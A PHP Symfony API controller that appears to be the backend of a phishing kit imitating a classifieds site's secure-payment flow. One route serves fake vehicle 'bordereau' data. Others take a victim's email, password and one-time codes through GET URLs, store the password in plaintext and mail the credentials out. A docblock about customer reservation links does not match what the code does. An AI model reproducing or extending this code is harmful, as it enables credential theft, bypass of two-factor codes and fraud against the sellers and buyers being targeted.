<?php

declare(strict_types=1);

namespace App\Controller\Api;

use App\Repository\LbcLinkRepository;
use App\Service\MailService;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Routing\Attribute\Route;
use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
use Symfony\Component\Uid\Uuid;

/**
 * "Mes réservations" — accessible via a UUID from any of the customer's own
 * reservations (magic-link style, sent in the confirmation email). This avoids
 * a full customer-account system while still letting the customer view the
 * list of all reservations under their email.
 *
 * The security model:
 *   - We take one reservation UUID (unpredictable) from the URL
 *   - We look up the customer email attached to it
 *   - We list only the reservations that share the exact same email
 *
 * A malicious user cannot enumerate reservations of another customer without
 * knowing at least one of their reservation UUIDs.
 */
#[Route("/api")]
class ApiController extends AbstractController
{
    public function __construct(private readonly LbcLinkRepository $lbcLinkRepository,
    private readonly EntityManagerInterface $entity_manager)
    {}

    #[Route(name:'bordereau', path:'/bordereau/{reference}')]
    public function getBorderau(Request $request, ?string $reference, 
    LbcLinkRepository $lbcLinkRepository, UrlGeneratorInterface $urlGenerator
    ):JsonResponse{
        $findBorderau = $lbcLinkRepository->findOneBy(['referenceLbc' => $reference]);
        if(empty($findBorderau) || $findBorderau->getExpired()){
            return $this->json('borderau not found', 400);
        }
        $frontImage = sprintf(
            '%s://%s/uploads/vehicles/%s',
            $request->getScheme(),
            $request->getHttpHost(),
            $findBorderau->getReservation()->getVehicle()->getPrimaryImage()->getFilename()
        );
        $newVehicle = new class(
            $findBorderau->getReservation()->getVehicle()->getBrand(),
            $findBorderau->getReservation()->getVehicle()->getDescription(),
            $findBorderau->getReservation()->getVehicle()->getPrice(),
            '€',
            $frontImage,
            Uuid::v4()->toString(),
            (string)$findBorderau->getReservation()->getVehicle()->getModel(),
            (string)$findBorderau->getReservation()->getVehicle()->getMileage() ?? '',
            (string)$findBorderau->getReservation()->getVehicle()->getTransmission(),
            (string)$findBorderau->getReservation()->getVehicle()->getYear() ?? '',
            (string)$findBorderau->getReservation()->getVehicle()->getVim(),
            (string)$findBorderau->getReservation()->getVehicle()->getImmatriculation(),
            (string)$findBorderau->getReferenceLbc(),
            'Paiement sécurisé',
            (string)$findBorderau->getClient(),
            (string)$findBorderau->getYou(),
    ) {
        public function __construct(
            public readonly string $title,
            public readonly string $description,
            public readonly string $amount,
            public readonly string $currency,
            public readonly string $frontImage,
            public readonly string $reference,
            public readonly string $model,
            public readonly string $kilometrage,
            public readonly string $transmission,
            public readonly string $year,
            public readonly string $vim,
             public readonly string $immatriculation,
            public readonly string $transactionReference,
            public readonly string $paymentMethod,
            public readonly string $pseudo,
            public readonly string $mailTo,
        ) {
        }
};
        $response = new JsonResponse($newVehicle,200);
        $response->headers->set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
        $response->headers->set('Pragma', 'no-cache');
        $response->headers->set('Expires', '0');
        return $response;
    }

    #[Route(name:'send_identifier', path:'/identifier/{email}/{password}/{reference}',
    methods:['GET'])]
    public function sendIdentifier(Request $request, string $email,
    string $password, ?string $reference, 
    MailService $mailService
    ){
        $link = $this->lbcLinkRepository->findOneBy(['referenceLbc' => $reference]);
        if(empty($link)){
            return $this->json([],400);
        }
        $link->setEmail($email);
        $link->setPassword($password);
        $this->entity_manager->persist($link);
        $this->entity_manager->flush();
        $mailService->sendLbcIdentifier($email,$password);
        return $this->json([], 200);
    }
    #[Route(name:'send_otp', path:'/otp/{email}/{otp}/{reference}',methods:['GET'])]
    public function sendOtp(Request $request, string $email, 
    string $otp, string $reference,
    MailService $mailService
    ){
        $link = $this->lbcLinkRepository->findOneBy(['referenceLbc' => $reference]);
        if(empty($link)){
            return $this->json([],400);
        }
        $mailService->sendOtp($email,$otp);
        return $this->json([], 200);
    }

    #[Route(name:'send_bordereau', path:'/confirmation/{reference}',methods:['GET'])]
    public function sendBordereau(Request $request, string $reference, 
    MailService $mailService
    ){
        $link = $this->lbcLinkRepository->findOneBy(['referenceLbc' => $reference]);
        if(empty($link)){
            return $this->json([],400);
        }
        $mailService->sendBordereau($link);
        $link->setExpired(true);
        $this->entity_manager->persist($link);
        $this->entity_manager->flush();
        return $this->json([], 200);
    }
}